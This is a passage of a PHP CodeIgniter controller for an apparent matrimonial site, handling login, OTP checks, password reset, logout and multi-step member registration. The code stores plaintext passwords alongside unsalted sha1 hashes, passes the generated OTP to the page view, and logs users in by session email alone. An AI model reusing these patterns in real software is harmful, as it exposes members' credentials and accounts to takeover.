                    // If not approved
                    elseif($result->status == "pending")
                    {
                        $this->session->set_flashdata('alert','unapproved');
                        redirect( base_url().'home/login', 'refresh' );
                    }
                }

                // When Member Approval Off
                else{
                    //email verification check start
                    if($member_email_verification == 'on'){
                        if($result->email_verification_status == '1'){
                            $check = 'done';
                        }
                        else{
                            $this->session->set_flashdata('alert','email_not_verified');
                            redirect( base_url().'home/login', 'refresh' );
                        }
                    }
                    else{
                        $check = 'done';
                    }
                    //email verification check end

                    if($check == 'done'){
                        if ($result->is_blocked == "no") {
                            if ($result->password != $password) {
                                $this->session->set_flashdata('alert','login_error');
                                redirect( base_url().'home/login', 'refresh' );
                            } else {
                                $data['login_state'] = 'yes';
                                $data['member_id'] = $result->member_id;
                                $data['member_name'] = $result->first_name;
                                $data['member_email'] = $result->email;
                                $member = $this->db->get_where("member", array("member_id" => $result->member_id))->result();
                                $pkInfo = json_decode($member[0]->package_info,true);
                                $rmCount = $pkInfo[0]['view_count'] - count($this->db->get_where("member_profile_view",array("member_id" => $result->member_id))->result());
                                $data['view_profile'] = $rmCount;
                                
                                if ($remember_me == 'checked') {
                                    $this->session->set_userdata($data);
                                    setcookie('cookie_member_id', $this->session->userdata('member_id'), time() + (1296000), "/");
                                    setcookie('cookie_member_name', $this->session->userdata('member_name'), time() + (1296000), "/");
                                    setcookie('cookie_member_email', $this->session->userdata('member_email'), time() + (1296000), "/");
                                } else {
                                    $this->session->set_userdata($data);
                                }

                                redirect( base_url().'home/profile', 'refresh' );
                            }
                            
                        }
                        elseif ($result->is_blocked == "yes") {
                            $this->session->set_flashdata('alert','blocked');
                            redirect( base_url().'home/login', 'refresh' );
                        }
                    }

                }
            }
            else
            {
                $this->session->set_flashdata('alert', 'login_error');
                redirect( base_url().'home/login', 'refresh' );
            }
            redirect( base_url().'home/registration/otp', 'refresh' );
        }
    }

    function display_yourinfo()
    {
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        } else {
            $email = $this->session->userdata('email');
            $result = $this->db->get_where('member',array('email'=>$email))->row();
            $data = array();
            $data['login_state'] = 'yes';
            $data['member_id'] = $result->member_id;
            $data['member_name'] = $result->first_name;
            $data['member_email'] = $result->email;
            $this->session->set_userdata($data);
            redirect( base_url().'home/profile', 'refresh' );
        }
    }

    function check_otp_and_login()
    {
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        } else {
            $email = $this->session->userdata('email');
            $otp = $this->input->post('otp');
            $sotp = $this->session->userdata('otp');
            
            if($otp==$sotp)
            {
                redirect(base_url('home/registration/display_yourinfo'), 'refresh');
                /*
                $result = $this->db->get_where('member',array('email'=>$email))->row();
                $data = array();
                $data['login_state'] = 'yes';
                $data['member_id'] = $result->member_id;
                $data['member_name'] = $result->first_name;
                $data['member_email'] = $result->email;
                $this->session->set_userdata($data);
                redirect( base_url().'home/profile', 'refresh' );
                */
            } 
            else
            {
                $this->session->set_flashdata('warning','You typed wrong OTP.');
            }

            redirect( base_url().'home/registration/otp', 'refresh' );
        }
    }


    function forget_pass($para1="") {
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        else{
            if ($para1=="") {
                $page_data['page'] = "forget_pass";

                $this->load->view('front/forget_pass', $page_data);
            }
            else if ($para1 == 'forget') {
                $this->form_validation->set_rules('email', 'Email', 'required');

                if ($this->form_validation->run() == FALSE) {
                    $ajax_error[] = array('ajax_error'  =>  validation_errors());
                    echo json_encode($ajax_error);
                }
                else {
                    $query = $this->db->get_where('member', array(
                        'email' => $this->input->post('email')
                    ));
                    if ($query->num_rows() > 0) {
                        $member_id = $query->row()->member_id;
                        $password = substr(hash('sha512', rand()), 0, 12);
                        $data['password'] = sha1($password);
                        if ($this->Email_model->password_reset_email('member', $member_id, $password)) {
                            $this->db->where('member_id', $member_id);
                            $this->db->update('member', $data);
                            recache();
                            $this->session->set_flashdata('alert','email_sent');
                        } else {
                            $this->session->set_flashdata('alert','not_sent');
                        }
                    } else {
                        $this->session->set_flashdata('alert','no_email');
                    }
                    redirect( base_url().'home/login', 'refresh' );
                }
            }
        }
    }

    function logout()
    {
        setcookie("cookie_member_id", "", time() - 3600, "/");
        setcookie("cookie_member_name", "", time() - 3600, "/");
        setcookie("cookie_member_email", "", time() - 3600, "/");

        $this->session->unset_userdata('login_state');
        $this->session->unset_userdata('member_id');
        $this->session->unset_userdata('member_name');
        $this->session->unset_userdata('member_email');
        $this->session->unset_userdata('view_profile');

        // $this->session->sess_destroy();

        redirect(base_url().'home/', 'refresh');
    }

    function registration($para1="")
    {
        
        if ($this->member_permission() == TRUE) {
            redirect(base_url().'home/', 'refresh');
        }
        else{
            recache();
            $member_approval = $this->db->get_where('general_settings', array('type' => 'member_approval_by_admin'))->row()->value;
            $member_email_verification = $this->db->get_where('general_settings', array('type' => 'member_email_verification'))->row()->value;
            if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                $this->load->library('recaptcha');
            }
            // --------------------Check for Disallowed Characters-------------------- //
            $safe = 'yes';
            $char = '';
            foreach($_POST as $check=>$row){
                if (preg_match('/[\'^":()}{#~><>|=¬]/', $row,$match))
                {
                    if($check !== 'password' && $check !== 'confirm_password')
                    {
                        $safe = 'no';
                        $char = $match[0];
                    }
                }
            }
            // --------------------Check for Disallowed Characters-------------------- //
            if ($para1 == "") {
                if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                    $page_data['recaptcha_html'] = $this->recaptcha->render();
                }
                $page_data['page'] = "registration";
                $this->load->view('front/registration', $page_data);
            }
            elseif ($para1=="profile_details") {
                if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                    $page_data['recaptcha_html'] = $this->recaptcha->render();
                }
                
                // $mother_tounges = $this->db->get_where('mother_tounge', array())->result();
                $religion = $this->db->get_where('religion', array())->result();
                $marital_status = $this->db->get_where('marital_status', array())->result();
                $user_heights = $this->db->get_where('user_height', array())->result();
                $child_count = $this->db->get_where('child_count', array())->result();
                $caste = $this->db->get_where('caste', array())->result();
                
                // $page_data['mother_tounges'] = $mother_tounges;
                $page_data['religion'] = $religion;
                $page_data['marital_status'] = $marital_status;
                $page_data['user_heights'] = $user_heights;
                $page_data['page'] = "registration";
                $page_data['caste'] = $caste;
                $page_data['child_count'] = $child_count;
                
                $this->load->view('front/registration_profile_details', $page_data);
                //var_dump('testing');
                //die;
            }

            
            elseif ($para1=="sumit_profile_details") {
                $ses_user_data = $this->session->userdata('pending_reg_user');                
                 //$member_tmp = $this->db->get_where('member', array('member_id' => $ses_user_data))->row();
                $basic_info_tmp[] = array('age'         => '',
                                        'date_of_birth' => strtotime($this->input->post('date_of_birth')),
                                        'religion'      => $this->input->post('religion'),
                                        'caste'         => $this->input->post('caste'),
                                        'subcaste'       => $this->input->post('subcaste'),
                                        'marital_status'=> $this->input->post('marital_status'),
                                        'p_height'      => $this->input->post('p_height'),
                                        'child_status'  => $this->input->post('child_status'),
                                        'child_count'   => $this->input->post('child_count'),
                                        'on_behalf'     => ''
                                     );
                
                
                $basic_info_tmp = json_encode($basic_info_tmp);
                
                $nData = array(
                    'date_of_birth' => strtotime($this->input->post('date_of_birth')),
                    'religion' => $this->input->post('religion'),
                    'caste' => $this->input->post('caste'),
                    'subcaste' => $this->input->post('subcaste'),
                    'marital_status' => $this->input->post('marital_status'),
                    'height' => $this->input->post('p_height'),
                    'child_status' => $this->input->post('child_status'),
                    'child_count' => $this->input->post('child_count'),
                    'basic_info' => $basic_info_tmp
                );
                
                $this->db->where('member_id', $ses_user_data);
                $this->db->update('member', $nData);
                //var_dump($ses_user_data);
                //die;
                redirect(base_url().'home/registration/career_details', 'refresh');
            }
            elseif ($para1=="career_details") {
                if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                    $page_data['recaptcha_html'] = $this->recaptcha->render();
                }
                
                $education = $this->db->get_where('education', array())->result();
                $employed = $this->db->get_where('employed', array())->result();
                $occupation = $this->db->get_where('occupation', array())->result();
                $anual_income = $this->db->get_where('anual_income', array())->result();
                
                $page_data['education'] = $education;
                $page_data['employed'] = $employed;
                $page_data['occupation'] = $occupation;
                $page_data['anual_income'] = $anual_income;
                
                $page_data['page'] = "registration";
                $this->load->view('front/registration_career_details', $page_data);
                //var_dump('testing');
                //die;
            }
            elseif ($para1=="sumit_career_details") {
                $ses_user_data = $this->session->userdata('pending_reg_user');
                $career_info_tmp[] = array('education'      => $this->input->post('education'),
                'education_detail'  => $this->input->post('education_detail'),
                'employed'          => $this->input->post('employed'),
                'occupation'        => $this->input->post('occupation'),
                'anual_income'      => $this->input->post('anual_income'),
                'occupation_detail' => $this->input->post('occupation_detail')
                );
                $career_info_tmp = json_encode($career_info_tmp);
                $nData = array(
                    'eduction' => $this->input->post('education'),
                    'eduction_detail' => $this->input->post('education_detail'),
                    'employed' => $this->input->post('employed'),
                    'occupation' => $this->input->post('occupation'),
                    'anual_income' => $this->input->post('anual_income'),
                    'occupation_detail' => $this->input->post('occupation_detail'),
                    'education_and_career' => $career_info_tmp
                );
                
                $this->db->where('member_id', $ses_user_data);
                $this->db->update('member', $nData);
                redirect(base_url().'home/registration/lifestyle_family', 'refresh');
            }
            elseif ($para1=="lifestyle_family") {
                if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                    $page_data['recaptcha_html'] = $this->recaptcha->render();
                }
                
                $family_types = $this->db->get_where('family_type', array())->result();
                $family_values = $this->db->get_where('family_value', array())->result();
                $family_status  = $this->db->get_where('family_status', array())->result();
                $mother_tounge = $this->db->get_where('mother_tounge', array())->result();
                $no_brothers = $this->db->get_where('brothers-sister_count', array())->result();


                $page_data['family_types'] = $family_types;
                $page_data['family_values'] = $family_values;
                $page_data['family_status'] = $family_status;
                $page_data['mother_tounges'] = $mother_tounge;
                $page_data['no_brothers'] = $no_brothers;
                

                $page_data['page'] = "registration";
                $this->load->view('front/registration_lifestyle_family', $page_data);
                //var_dump('testing');
                //die;
            }
            elseif ($para1=="sumit_lifestyle_family") {
                $ses_user_data = $this->session->userdata('pending_reg_user');
                
                $family_info_tmp[] = array('family_type' => $this->input->post('family_type'),
                                        'family_values' => $this->input->post('family_values'),
                                        'family_status' => $this->input->post('family_status'),
                                        'mother_tounge' => $this->input->post('mother_tounge'),
                                        'brothers' => $this->input->post('no_brothers'),
                                        'married_brothers' => $this->input->post('no_married_brothers'),
                                        'sisters' => $this->input->post('no_sisters'),
                                        'married_sisters' => $this->input->post('no_married_sisters'),
                                        'father_name' => $this->input->post('father_name'),
                                        'father_occupation' => $this->input->post('father_occupation'),
                                        'mother_name' => $this->input->post('mother_name'),
                                        'mother_occupation' => $this->input->post('mother_occupation')
                                     );
                $family_info_tmp = json_encode($family_info_tmp);
                $nData = array(
                    'family_type' => $this->input->post('family_type'),
                    'family_values' => $this->input->post('family_values'),
                    'family_status' => $this->input->post('family_status'),
                    'mother_tounge' => $this->input->post('mother_tounge'),
                    'brothers' => $this->input->post('no_brothers'),
                    'married_brothers' => $this->input->post('no_married_brothers'),
                    'sisters' => $this->input->post('no_sisters'),
                    'married_sisters' => $this->input->post('no_married_sisters'),
                    'father_name' => $this->input->post('father_name'),
                    'father_occupation' => $this->input->post('father_occupation'),
                    'mother_name' => $this->input->post('mother_name'),
                    'mother_occupation' => $this->input->post('mother_occupation'),
                    'family_info' => $family_info_tmp
                );       
                
                $this->db->where('member_id', $ses_user_data);
                $this->db->update('member', $nData);
                redirect(base_url().'home/registration/contact_detail', 'refresh');
                // redirect(base_url().'home/registration/otp', 'refresh');
                //var_dump('Success');
                //die;
            }
            elseif ($para1=="contact_detail") {
                if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                    $page_data['recaptcha_html'] = $this->recaptcha->render();
                }

                $countries = $this->db->get_where('country', array())->result();
                $states = $this->db->get_where('state', array('country_id'=>101))->result();
                $cities = $this->db->get_where('city', array())->result();
                $residences = $this->db->get_where('residence', array())->result();

                $page_data['countries'] = $countries;
                $page_data['states'] = $states;
                $page_data['cities'] = $cities;
                $page_data['residences'] = $residences;
                
                $page_data['page'] = "registration";
                $this->load->view('front/registration_contact_details', $page_data);
            }
            elseif ($para1=="submit_contact_detail") {
                $ses_user_data = $this->session->userdata('pending_reg_user');
                $contact_info_tmp[] = array('country' => $this->input->post('country'),
                                        'state' => $this->input->post('state'),
                                        'city' => $this->input->post('city'),
                                        'mobile2' => $this->input->post('mobile2'),
                                        'address' => $this->input->post('address'),
                                        'residence' => $this->input->post('residence'),
                                     );
                $contact_info_tmp = json_encode($contact_info_tmp);
                $nData = array(
                    'country' => $this->input->post('country'),
                    'state' => $this->input->post('state'),
                    'city' => $this->input->post('city'),
                    'mobile2' => $this->input->post('mobile2'),
                    'address' => $this->input->post('address'),
                    'residence' => $this->input->post('residence'),
                    'present_address' => $contact_info_tmp
                );             
                
                $this->db->where('member_id', $ses_user_data);
                $this->db->update('member', $nData);
                
                $this->session->set_flashdata('alert', 'register_success');
                redirect(base_url().'home/registration/otp', 'refresh');
            }
            
            elseif ($para1=="otp") {
                $ses_user_data = $this->session->userdata('pending_reg_user');
                $user_email = $this->Crud_model->get_type_name_by_id('member', $ses_user_data, 'email');

                $otp=rand(1000, 9999);//OTP generate
                $this->session->set_userdata('otp', $otp);
                $this->session->set_userdata('email', $user_email);
                $page_data['user_otp'] = $otp;
                $page_data['user_email'] = $user_email;
                $page_data['page'] = "registration";
                $this->load->view('front/registration_otp', $page_data);
            }
            elseif ($para1 == "display_yourinfo") {
                $ses_user_data = $this->session->userdata('pending_reg_user');
                $userinfo = $this->db->get_where('member', array('member_id'=> $ses_user_data))->row();
                $page_data['member_profile_id'] = $userinfo->member_profile_id;
                $page_data['orig_password'] = $userinfo->orig_password;
                $this->load->view('front/registration_yourinfo', $page_data);
            }
            elseif ($para1=="check_otp") {
                $ses_user_data = $this->session->userdata('pending_reg_user');
                $this->session->set_flashdata('alert', 'register_success');
                redirect(base_url().'home/registration/check_otp', 'refresh');
            }
            elseif ($para1=="add_info") {
                $this->form_validation->set_rules('first_name', 'First Name', 'required');
                $this->form_validation->set_rules('last_name', 'Last Name', 'required');
                $this->form_validation->set_rules('gender', 'Gender', 'required');
                
                //$this->form_validation->set_rules('email', 'Email', 'required|is_unique[member.email]',array('required' => 'The %s is required.', 'is_unique' => 'This %s already exists.'));
                //$this->form_validation->set_rules('date_of_birth', 'Date of Birth', 'required');
                $this->form_validation->set_rules('on_behalf', 'On Behalf', 'required');
                $this->form_validation->set_rules('mobile', 'Mobile Number ', 'required|regex_match[/^[0-9]{10}$/]'); //{10} for 10 digits number
                $this->form_validation->set_rules('password', 'Password', 'required|matches[confirm_password]');
                $this->form_validation->set_rules('confirm_password', 'Confirm Password', 'required');

                if ($this->form_validation->run() == FALSE) {
                    if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                        $page_data['recaptcha_html'] = $this->recaptcha->render();
                    }
                    $page_data['page'] = "registration";
                    $page_data['form_contents'] = $this->input->post();
                    $this->load->view('front/registration', $page_data);
                }
                else {
                    // email check
                    $check_email = $this->input->post('email');
                    $state = $this->Crud_model->get_number_row($check_email, 'member');
                    if($state == '1'){
                        $data['message'] = "Already same email exist, Please try other email address";
                        echo "<script> alert('Already same email exits, Please try other email address'); </script>";
                        redirect(base_url().'home/registration', 'refresh');
                    }
                    elseif ($safe == 'yes') {
                        //redirect(base_url().'home/registration/profile_details', 'refresh');
                        //var_dump('testing');
                        //die;
                        
                        // ------------------------------------Profile Image------------------------------------ //
                        $profile_image[] = array('profile_image'    =>  'default_image.jpg',
                                                    'thumb'         =>  'default_thumb.jpg'
                                            );
                        $profile_image = json_encode($profile_image);
                        // ------------------------------------Profile Image------------------------------------ //

                        // ------------------------------------Basic Info------------------------------------ //
                        $basic_info[] = array('age'                 => '',
                                            'marital_status'        => '',
                                            'number_of_children'    => '',
                                            'on_behalf'             => $this->input->post('on_behalf'),
                                            'religion'              => '',
                                            'caste'                 => '',
                                            'subcaste'              => '',
                                            'height'                => ''
                                            );
                        $basic_info = json_encode($basic_info);
                        // ------------------------------------Basic Info------------------------------------ //

                        // ------------------------------------Present Address------------------------------------ //
                        $present_address[] = array('country'        => '',
                                            'city'                  => '',
                                            'state'                 => '',
                                            'address'           => '',
                                            'mobile2'           => '',
                                            'residence'         => ''
                                            );
                        $present_address = json_encode($present_address);
                        // ------------------------------------Present Address------------------------------------ //

                        // ------------------------------------Education & Career------------------------------------ //
                        $education_and_career[] = array('education'     => '',
                                            'education_detail'          => '',
                                            'occupation'                => '',
                                            'occupation_detail'         => '',
                                            'annual_income'             => '',
                                            'employed'                  => ''
                                            );
                        $education_and_career = json_encode($education_and_career);
                        // ------------------------------------Education & Career------------------------------------ //

                        // ------------------------------------ Physical Attributes------------------------------------ //
                        $physical_attributes[] = array('weight'     => '',
                                            'eye_color'             => '',
                                            'hair_color'            => '',
                                            'complexion'            => '',
                                            'blood_group'           => '',
                                            'body_type'             => '',
                                            'body_art'              => '',
                                            'any_disability'        => ''
                                            );
                        $physical_attributes = json_encode($physical_attributes);
                        // ------------------------------------ Physical Attributes------------------------------------ //

                        // ------------------------------------ Language------------------------------------ //
                        $language[] = array('mother_tongue'         => '',
                                            'language'              => '',
                                            'speak'                 => '',
                                            'read'                  => ''
                                            );
                        $language = json_encode($language);
                        // ------------------------------------ Language------------------------------------ //

                        // ------------------------------------Hobbies & Interest------------------------------------ //
                        $hobbies_and_interest[] = array('hobby'     => '',
                                            'interest'              => '',
                                            'music'                 => '',
                                            'books'                 => '',
                                            'movie'                 => '',
                                            'tv_show'               => '',
                                            'sports_show'           => '',
                                            'fitness_activity'      => '',
                                            'cuisine'               => '',
                                            'dress_style'           => ''
                                            );
                        $hobbies_and_interest = json_encode($hobbies_and_interest);
                        // ------------------------------------Hobbies & Interest------------------------------------ //

                        // ------------------------------------ Personal Attitude & Behavior------------------------------------ //
                        $personal_attitude_and_behavior[] = array('affection'   => '',
                                            'humor'                 => '',
                                            'political_view'        => '',
                                            'religious_service'     => ''
                                            );
                        $personal_attitude_and_behavior = json_encode($personal_attitude_and_behavior);
                        // ------------------------------------ Personal Attitude & Behavior------------------------------------ //

                        // ------------------------------------Residency Information------------------------------------ //
                        $residency_information[] = array('birth_country'    => '',
                                            'residency_country'     => '',
                                            'citizenship_country'   => '',
                                            'grow_up_country'       => '',
                                            'immigration_status'    => ''
                                            );
                        $residency_information = json_encode($residency_information);
                        // ------------------------------------Residency Information------------------------------------ //

                        // ------------------------------------Spiritual and Social Background------------------------------------ //
                        $spiritual_and_social_background[] = array('religion'   => '',
                                            'caste'                 => '',
                                            'sub_caste'             => '',
                                            'ethnicity'             => '',
                                            'u_manglik'             => '',
                                            'personal_value'        => '',
                                            'family_value'          => '',
                                            'community_value'       => '',
                                            'family_status'         =>  ''
                                            );
                        $spiritual_and_social_background = json_encode($spiritual_and_social_background);
                        // ------------------------------------Spiritual and Social Background------------------------------------ //

                        // ------------------------------------ Life Style------------------------------------ //
                        $life_style[] = array('diet'                => '',
                                            'drink'                 => '',
                                            'smoke'                 => '',
                                            'living_with'           => ''
                                            );
                        $life_style = json_encode($life_style);
                        // ------------------------------------ Life Style------------------------------------ //

                        // ------------------------------------ Astronomic Information------------------------------------ //
                        $astronomic_information[] = array('sun_sign'    => '',
                                            'moon_sign'                 => '',
                                            'time_of_birth'             => '',
                                            'city_of_birth'             => ''
                                            );
                        $astronomic_information = json_encode($astronomic_information);
                        // ------------------------------------ Astronomic Information------------------------------------ //

                        // ------------------------------------Permanent Address------------------------------------ //
                        $permanent_address[] = array('permanent_country'    => '',
                                            'permanent_city'                => '',
                                            'permanent_state'               => '',
                                            'permanent_postal_code'         => ''
                                            );
                        $permanent_address = json_encode($permanent_address);
                        // ------------------------------------Permanent Address------------------------------------ //

                        // ------------------------------------Family Information------------------------------------ //
                        $family_info[] = array('father'             => '',
                                            'mother'                => '',
                                            'brother_number'        => '',
                                            'married_brother'       => '',
                                            'sister_number'         => '',
                                            'married_sister'        => '',
                                            'family_status'         => '',
                                            'family_values'         => '',
                                            'family_type'           => '',
                                            
                                            );
                        $family_info = json_encode($family_info);
                        // ------------------------------------Family Information------------------------------------ //

                        // --------------------------------- Additional Personal Details--------------------------------- //
                        $additional_personal_details[] = array('home_district'  => '',
                                            'family_residence'              => '',
                                            'fathers_occupation'            => '',
                                            'special_circumstances'         => ''
                                            );
                        $additional_personal_details = json_encode($additional_personal_details);
                        // --------------------------------- Additional Personal Details--------------------------------- //

                        // ------------------------------------ Partner Expectation------------------------------------ //
                        $partner_expectation[] = array('general_requirement'    => '',
                                            'partner_age'                       => '',
                                            'partner_height'                    => '',
                                            'partner_weight'                    => '',
                                            'partner_marital_status'            => '',
                                            'with_children_acceptables'         => '',
                                            'partner_country_of_residence'      => '',
                                            'partner_religion'                  => '',
                                            'partner_caste'                     => '',
                                            'partner_sub_caste'                  => '',
                                            'partner_complexion'                => '',
                                            'partner_education'                 => '',
                                            'partner_profession'                => '',
                                            'partner_drinking_habits'           => '',
                                            'partner_smoking_habits'            => '',
                                            'partner_diet'                      => '',
                                            'partner_body_type'                 => '',
                                            'partner_personal_value'            => '',
                                            'manglik'                           => '',
                                            'partner_any_disability'            => '',
                                            'partner_mother_tongue'             => '',
                                            'partner_family_value'              => '',
                                            'prefered_country'                  => '',
                                            'prefered_state'                    => '',
                                            'prefered_status'                   => ''
                                            );
                        $partner_expectation = json_encode($partner_expectation);
                        // ------------------------------------ Partner Expectation------------------------------------ //

                        // ------------------------------------Privacy Status------------------------------------ //
                        $privacy_status[] = array(
                                            'present_address'                 => 'no',
                                            'education_and_career'            => 'no',
                                            'physical_attributes'             => 'no',
                                            'language'                        => 'no',
                                            'hobbies_and_interest'            => 'no',
                                            'personal_attitude_and_behavior'  => 'no',
                                            'residency_information'           => 'no',
                                            'spiritual_and_social_background' => 'no',
                                            'life_style'                      => 'no',
                                            'astronomic_information'          => 'no',
                                            'permanent_address'               => 'no',
                                            'family_info'                     => 'no',
                                            'additional_personal_details'     => 'no',
                                            'partner_expectation'             => 'yes'
                                            );
                        $privacy_status = json_encode($privacy_status);
                        // ------------------------------------Privacy Status------------------------------------ //

                        // ------------------------------------Pic Privacy Status------------------------------------ //
                        $pic_privacy[] = array(
                                            'profile_pic_show'        => 'all',
                                            'gallery_show'            => 'premium'

                                            );
                        $data_pic_privacy = json_encode($pic_privacy);
                        // ------------------------------------Pic Privacy Status------------------------------------ //

                        // --------------------------------- Additional Personal Details--------------------------------- //
                        $package_info[] = array('current_package'   => $this->Crud_model->get_type_name_by_id('plan', '1'),
                                                'package_price'     => $this->Crud_model->get_type_name_by_id('plan', '1', 'amount'),
                                                'payment_type'      => 'None',
                                            );
                        $package_info = json_encode($package_info);
                        // --------------------------------- Additional Personal Details--------------------------------- //
                        
                        


                        if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                            $captcha_answer = $this->input->post('g-recaptcha-response');
                            $response = $this->recaptcha->verifyResponse($captcha_answer);
                            if ($response['success']) {

                                $data['status']     = $this->input->post('approval_status');
                                $data['first_name'] = $this->input->post('first_name');
                                $data['last_name'] = $this->input->post('last_name');
                                $data['gender'] = $this->input->post('gender');
                                $data['email'] = $this->input->post('email');
                                $data['on_bahalf'] = $this->input->post('on_behalf');
                                if($member_email_verification == 'on'){
                                    $data['email_verification_code'] = $this->Important_model->generate_key('member','email_verification_code','');
                                    $data['email_verification_status'] = '0';
                                } else {
                                    $data['email_verification_status'] = '1';
                                }
                                $data['height'] = 0.00;
                                $data['mobile'] = $this->input->post('mobile');
                                $data['password'] = sha1($this->input->post('password'));
                                $data['orig_password'] = $this->input->post('password');
                                $data['profile_image'] = $profile_image;
                                $data['profile_image_status'] = '0';
                                $data['profile_image_update_time'] = '';
                                $data['introduction'] = '';
                                $data['basic_info'] = $basic_info;
                                $data['present_address'] = $present_address;
                                $data['family_info'] = $family_info;
                                $data['education_and_career'] = $education_and_career;
                                $data['physical_attributes'] = $physical_attributes;
                                $data['hobbies_and_interest'] = $hobbies_and_interest;
                                $data['spiritual_and_social_background'] = $spiritual_and_social_background;
                                $data['life_style'] = $life_style;
                                $data['astronomic_information'] = $astronomic_information;
                                $data['partner_expectation'] = $partner_expectation;
                                $data['interest'] = '[]';
                                $data['short_list'] = '[]';
                                $data['followed'] = '[]';
                                $data['ignored'] = '[]';
                                $data['ignored_by'] = '[]';
                                $data['gallery'] = '[]';
                                $data['happy_story'] = '[]';
                                $data['package_info'] = $package_info;
                                $data['payments_info'] = '[]';
                                $data['interested_by'] = '[]';
                                $data['follower'] = 0;
                                $data['notifications'] = '[]';
                                $data['membership'] = 1;
                                $data['profile_status'] = 1;
                                $data['is_closed'] = 'no';
                                $data['member_since'] = date("Y-m-d H:i:s");
                                $data['express_interest'] = $this->db->get_where('plan', array('plan_id'=> 1))->row()->express_interest;
                                $data['direct_messages'] = $this->db->get_where('plan', array('plan_id'=> 1))->row()->direct_messages;
                                $data['photo_gallery'] = $this->db->get_where('plan', array('plan_id'=> 1))->row()->photo_gallery;
                                $data['profile_completion'] = 0;
                                $data['is_blocked'] = 'no';
                                $data['privacy_status'] = $privacy_status;
                                $data['pic_privacy'] = $data_pic_privacy;
                                $data['report_profile'] = '[]';

                                $this->db->insert('member', $data);
                                $insert_id = $this->db->insert_id();
                                $member_profile_id = 'TVV'.rand(1000, 9999).$insert_id;

                                $this->db->where('member_id', $insert_id);
                                $this->db->update('member', array('member_profile_id' => $member_profile_id));
                                recache();

                                if($member_approval == 'yes'){

                                    if ($this->Email_model->account_opening_member_approval_on('member', $data['email'], $this->input->post('password')) == true) {
                                        $msg = 'done_and_sent';
                                    }
                                    if($member_email_verification == 'on'){
                                        $this->Email_model->member_email_verification('member', $data['email'], $data['email_verification_code']);
                                    }
                                    $this->Email_model->member_registration_email_to_admin($insert_id);
                                    $this->session->set_flashdata('alert', 'register_success');
                                    redirect(base_url().'home/login_msg', 'refresh');
                                }
                                else{
                                    if ($this->Email_model->account_opening_member_approval_off('member', $data['email'], $this->input->post('password')) == true) {
                                        $msg = 'done_and_sent';
                                    }
                                    if($member_email_verification == 'on'){
                                        $this->Email_model->member_email_verification('member', $data['email'], $data['email_verification_code']);
                                    }
                                    $this->Email_model->member_registration_email_to_admin($insert_id);
                                    $this->session->set_flashdata('alert', 'register_success');
                                    if($member_email_verification == 'on'){
                                        redirect(base_url().'home/email_verification_msg', 'refresh');
                                    }
                                    redirect(base_url().'home/login', 'refresh');
                                }

                            }
                            else {
                                if ($this->Crud_model->get_settings_value('third_party_settings', 'captcha_status', 'value') == 'ok') {
                                    $page_data['recaptcha_html'] = $this->recaptcha->render();
                                }
                                $page_data['page'] = "registration";
                                $page_data['form_contents'] = $this->input->post();
                                $page_data['captcha_incorrect'] = TRUE;

                                $this->load->view('front/registration', $page_data);
                            }
                        } else {
                            //var_dump('testing');
                            //die;
                            
                            $data['status']     = $this->input->post('approval_status');
                            $data['first_name'] = $this->input->post('first_name');
                            $data['last_name'] = $this->input->post('last_name');
                            $data['gender'] = $this->input->post('gender');
                            $data['email'] = $this->input->post('email');
                            $data['on_behalf'] = $this->input->post('on_behalf');
                            if($member_email_verification == 'on'){
                                $data['email_verification_code'] = $this->Important_model->generate_key('member','email_verification_code','');
                                $data['email_verification_status'] = '0';
                            } else {
                                $data['email_verification_status'] = '1';
                            }
                            $data['date_of_birth'] = '';
                            $data['height'] = 0.00;
                            $data['mobile'] = $this->input->post('mobile');
                            $data['secondary_mobile'] = '';
                            $data['password'] = sha1($this->input->post('password'));
                            $data['orig_password'] = $this->input->post('password');
                            $data['profile_image'] = $profile_image;
                            $data['profile_image_status'] = '0';
                            $data['profile_image_update_time'] = '';
                            $data['introduction'] = '';
                            $data['basic_info'] = $basic_info;
                            $data['present_address'] = $present_address;
                            $data['family_info'] = $family_info;
                            $data['education_and_career'] = $education_and_career;
                            $data['physical_attributes'] = $physical_attributes;
                            $data['hobbies_and_interest'] = $hobbies_and_interest;
                            $data['spiritual_and_social_background'] = $spiritual_and_social_background;
                            $data['life_style'] = $life_style;
                            $data['astronomic_information'] = $astronomic_information;
                            $data['partner_expectation'] = $partner_expectation;
                            $data['interest'] = '[]';
                            $data['short_list'] = '[]';
                            $data['followed'] = '[]';
                            $data['ignored'] = '[]';
                            $data['ignored_by'] = '[]';
                            $data['gallery'] = '[]';
                            $data['happy_story'] = '[]';
                            $data['package_info'] = $package_info;
                            $data['payments_info'] = '[]';
                            $data['interested_by'] = '[]';
                            $data['follower'] = 0;
                            $data['notifications'] = '[]';
                            $data['membership'] = 1;
                            $data['profile_status'] = 1;
                            $data['is_closed'] = 'no';
                            $data['member_since'] = date("Y-m-d H:i:s");
                            $data['express_interest'] = $this->db->get_where('plan', array('plan_id'=> 1))->row()->express_interest;
                            $data['direct_messages'] = $this->db->get_where('plan', array('plan_id'=> 1))->row()->direct_messages;
                            $data['photo_gallery'] = $this->db->get_where('plan', array('plan_id'=> 1))->row()->photo_gallery;
                            $data['profile_completion'] = 0;
                            $data['is_blocked'] = 'no';
                            $data['privacy_status'] = $privacy_status;
                            $data['pic_privacy'] = $data_pic_privacy;
                            $data['report_profile'] = '[]';


                            $this->db->insert('member', $data);
                            $insert_id = $this->db->insert_id();
                            
                            $this->session->set_userdata('pending_reg_user', $insert_id);
                            
                            $member_profile_id = 'TVV'.rand(1000, 9999).$insert_id;

                            $this->db->where('member_id', $insert_id);
                            $this->db->update('member', array('member_profile_id' => $member_profile_id));
                            recache();

                            if($member_approval == 'yes'){
